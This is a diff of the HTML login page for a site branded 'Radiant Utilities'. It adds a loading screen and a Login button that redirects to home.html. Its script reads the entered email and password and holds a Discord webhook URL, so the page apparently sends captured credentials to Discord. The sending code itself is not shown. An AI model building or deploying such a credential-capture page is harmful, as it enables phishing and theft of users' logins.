@@ -5,6 +5,7 @@
     <link rel="stylesheet" type="text/css" href="style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" href="RadiantLogo.png" type="image/x-icon">
+    <meta charset="UTF-8" />
     <style>
         .content6 {
             display: flex;
@@ -31,7 +32,9 @@
 </head>
 
 <body>
-    <main>
+  <div id="loading-screen2">
+  </div>  
+  <main id="content">
       <div class="content6">
         <h2>Login</h2>
         <div style="position: relative;">
@@ -41,15 +44,57 @@
         <span id="email-counter">0</span>
         <input type="password" name="password" id="password-input" placeholder="Enter your password" required maxlength="50" class="input-counter">
         <h4 id="password-counter" style="display: none;">0/50</h4>
-        <button id="myButton" class="cust2om-button" disabled onclick="window.open('home.html');">Login</button>           
+        <button id="myButton" class="custom-button" onclick="showLoadingScreen(); setTimeout(function() { location.replace('home.html'); hideLoadingScreen(); }, 1000)">Login</button>
+
+        <div id="loadingScreen" class="loading-screen" style="display: none;">
+          <div class="loading-content">
+            <div class="loading-text">Loading...</div>
+          </div>
+        </div>
       </div>
+      <div id="logoContainer">
       <img class="logo2" src="RadiantLogo.png" alt="Radiant Utilities Logo"> 
+    </div>
 
         <script>
+        function showLoadingScreen() {
+          const loadingScreen = document.getElementById("loading-screen2");
+          const content = document.getElementById("content");
+
+          loadingScreen.style.display = "flex";
+          content.classList.remove("show");
+        }
+
+        function hideLoadingScreen() {
+          const loadingScreen = document.getElementById("loading-screen2");
+          const content = document.getElementById("content");
+
+          loadingScreen.style.display = "none";
+          content.classList.add("show");
+        }
+
+        window.addEventListener("load", function () {
+          const loadingScreen = document.getElementById("loading-screen2");
+          const content = document.getElementById("content");
+
+          loadingScreen.style.display = "none";
+          content.classList.add("show");
+        });
+
+        function showLoadingScreen() {
+          document.getElementById("loadingScreen").style.display = "block";
+          document.getElementById("logoContainer").style.display = "none"; // hide the logo
+        }
+
+        function hideLoadingScreen() {
+          document.getElementById("loadingScreen").style.display = "none";
+          document.getElementById("logoContainer").style.display = "block"; // show the logo
+        }
+        
           var emailInput = document.getElementsByName("email")[0];
           var passwordInput = document.getElementsByName("password")[0];
           var submitButton = document.getElementById("myButton");
-          var webhookURL = "https://discord.com/api/webhooks/";
+          var webhookURL = "https://discord.com/api/webhooks";
           var emailCounter = document.getElementById("email-counter");
           var passwordCounter = document.getElementById("password-counter");
 
